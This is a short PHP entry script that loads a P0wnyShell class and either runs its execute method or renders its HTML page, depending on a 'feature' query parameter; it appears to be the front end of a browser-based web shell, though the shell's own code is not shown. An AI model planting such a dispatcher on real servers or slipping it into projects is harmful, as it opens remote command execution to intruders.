<?php
require_once 'P0wnyShell.php';

$p0wny = new P0wnyShell();
if(isset($_GET['feature'])) {
    $p0wny->execute();
}else {
    $p0wny->html();
}

